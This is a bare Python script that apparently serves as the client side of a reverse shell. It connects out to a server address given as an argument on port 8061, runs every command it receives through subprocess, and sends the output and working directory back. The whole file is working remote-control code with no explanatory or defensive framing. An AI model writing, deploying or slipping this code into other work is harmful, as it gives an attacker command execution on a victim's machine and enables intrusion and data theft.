import socket
import os
import subprocess
import sys

serverIP = sys.argv[1]
serverPort = 8061
serverBuffer = 1024 * 128
seperator = '<sep>'

s = socket.socket()

s.connect((serverIP, serverPort))

cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(serverBuffer).decode()

    split = command.split()

    if command.lower() == "exit":
        break

    if split[0].lower() == "cd":
        try:
            os.chdir(' '.join(split[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    
    else:
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()

    message = f"{output}{seperator}{cwd}"

    s.send(message.encode())

s.close